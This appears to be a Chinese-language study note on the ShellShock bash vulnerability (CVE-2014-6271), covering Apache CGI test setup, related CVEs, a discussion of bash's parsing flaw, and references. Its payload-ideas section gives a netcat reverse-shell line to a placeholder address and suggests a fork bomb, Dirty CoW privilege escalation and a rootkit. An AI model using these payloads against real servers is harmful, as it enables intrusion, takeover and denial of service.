---
title: CVE-2014-6271
category: Sec
---

## ShellShock

### 基本信息

### 测试

#### 涉及到的 CGI 知识

这是一个 bash 漏洞，但是相关的攻击往往是远程，借助 CGI 发起的。所以关于 CGI 的相关知识要介绍一下（详细的协议可以学习第十三个参考链接）。

#### Pwn

自己写简单的 CGI 进行测试时要注意默认情况下 Apache2 的 CGI 路径为 /usr/lib/cgi-bin/ 。把你的 CGI 脚本放进去，并检查一下 /etc/apache2/mods-enabled/ 下有没有 cgi.load 、 cgid.load 、 cgid.conf 这三个配置文件，没有，则说明你的 Apache2 默认没有启用 CGI ，这时候你尝试访问 localhost/cgi-bin/myprog.cgi 是失败的。需要把 /etc/apache2/mods-available/ 下的三个文件链接到 /etc/apache2/mods-enabled/ 下（刚刚提到的那三个）：

```
ln -s /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load
ln -s /etc/apache2/mods-available/cgid.load /etc/apache2/mods-enabled/cgid.load
ln -s /etc/apache2/mods-available/cgid.conf /etc/apache2/mods-enabled/cgid.conf
```

注意，在链接时不要使用相对路径。

另外还有 CVE-2014-7169, CVE-2014-6277, CVE-2014-6278 。一切都是因为 6271 的补丁存在漏洞。

#### 姿势

有了 PoC ，替换一下攻击载荷就能够有千百种看脑洞的姿势了。比如：

- 反向连接出来一个 shell `nc -e /bin/bash xxx.xxx.xxx.xxx xxxx`
- 放一个 ++[Fork bomb](http://www.00100011f.cc/237/)++ （我在虚拟机上测试了下，有效）
- 一般 Apache2 是以 www-data 用户运行的，所以在第一个姿势完成后，就要想办法提权了，比如 Dirty CoW ？（留个坑，可以尝试一下）
- 按照渗透测试走，这里就该后渗透阶段了。上个 rootkit 什么的，总之姿势很多

### 总结

网上有同学说这个漏洞的锅不应该让 bash 来背，是服务器程序直接把用户的输入交给 bash 处理导致的。经过研究，我认为这的确是 bash 的原因。如上所述，它的语法解析逻辑存在问题。很明显，既然是定义环境变量，那么从这个意义上讲，环境变量只能作为一个数据存在，而不应该成为指令执行。

### 参考

- [mubix/shellshocker-pocs](https://github.com/mubix/shellshocker-pocs)
- [hannob/bashcheck](https://github.com/hannob/bashcheck)
- [DanMcInerney/shellshock-hunter](https://github.com/DanMcInerney/shellshock-hunter)
- [Bash 3.0-4.3命令执行漏洞分析](http://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/)
- 《“破壳”漏洞深度剖析》by 郭瑞
- *Shellshock Vulnerability* by Tudor Enache  (OWASP)
- *SEED Labs – Shellshock Attack Lab*
- [Bash 漏洞是什么级别的漏洞，有什么危害，具体如何修复？ (知乎)](https://www.zhihu.com/question/25522948?rf=25539470)
- [从语法解析角度分析Bash破壳漏洞 ](http://www.freebuf.com/articles/web/45520.html)
- [SEED实验系列：ShellShock攻击实验](http://www.freebuf.com/articles/network/62622.html)
- [破壳（ShellShock）漏洞样本分析报告 ](http://www.freebuf.com/articles/system/45390.html)
- [The Common Gateway Interface (CGI) Version 1.1](http://www.ietf.org/rfc/rfc3875)
- CVE-2014-6271资料汇总 （来自乌云，怀念乌云）